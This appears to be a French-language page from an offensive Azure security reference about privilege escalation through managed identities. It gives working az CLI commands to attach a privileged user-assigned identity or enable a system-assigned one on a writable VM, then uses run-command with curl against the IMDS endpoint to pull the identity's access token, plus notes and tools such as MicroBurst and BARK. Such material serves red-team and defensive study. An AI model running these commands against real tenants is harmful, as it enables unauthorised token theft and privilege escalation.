---
title: "Attribution d'identité managée : attacher une identité privilégiée et forger son token"
order: 4
description: "Attacher une identité managée user-assigned privilégiée, ou activer une identité system-assigned, sur une ressource sur laquelle vous pouvez écrire, puis forger son token."
keywords:
  - identité managée
  - user-assigned
  - system-assigned
  - token
  - écriture de ressource
  - attribution
---

# Attribution d'identité managée

Si vous pouvez écrire une ressource (une VM, une Function App, un Automation Account ou un conteneur) et que cette ressource peut recevoir une identité managée, vous pouvez attacher une **identité user-assigned privilégiée** ou activer une identité **system-assigned**, puis exécuter du code ou lire le point de terminaison de métadonnées sur cette ressource pour forger le token de l'identité. C'est l'analogue Azure du passage d'un rôle à un service : le RBAC de l'identité devient le vôtre.

## Attacher une identité user-assigned à une VM

```bash
# attach an existing privileged user-assigned identity
az vm identity assign --name <vm> --resource-group <rg> \
  --identities /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>

# then on the VM, pull that identity's token from IMDS
az vm run-command invoke --name <vm> -g <rg> --command-id RunShellScript \
  --scripts "curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<uami-client-id>'"
```

Pour une identité system-assigned, `az vm identity assign --name <vm> -g <rg>` sans `--identities` l'active, après quoi le même appel IMDS (sans `client_id`) renvoie son token.

## Notes d'exploitation

- Le schéma attacher-puis-exécuter nécessite une écriture sur la ressource plus la capacité d'y exécuter du code (`virtualMachines/write` + run command, ou un déploiement de Function) ; voir la surface [compute](../../compute/virtual-machines/index.md) pour la moitié exécution.
- Une même identité user-assigned est souvent partagée entre de nombreuses ressources, donc un seul pied dans la porte de niveau `Contributor` capable de l'attacher hérite de son RBAC partout, voir [user-assigned](../managed-identities/user-assigned.md).
- Le détail de la récupération du token (point de terminaison IMDS, paramètres resource et client_id) se trouve sous [credentials](../../credentials/instance-metadata/index.md) ; cette page porte sur l'obtention de l'identité en premier lieu.

## Outils

- **az cli** (`az vm identity assign`, `az functionapp identity assign`, run command).
- **MicroBurst** (modules de type `Get-AzureManagedIdentityToken`).
- **BARK** (`Invoke-AzureVMRunCommand`, abus d'identité managée).

## Références

- [SpecterOps : chemins d'attaque des identités managées (BARK)](https://github.com/BloodHoundAD/BARK)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft : identités managées pour les ressources Azure](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview)
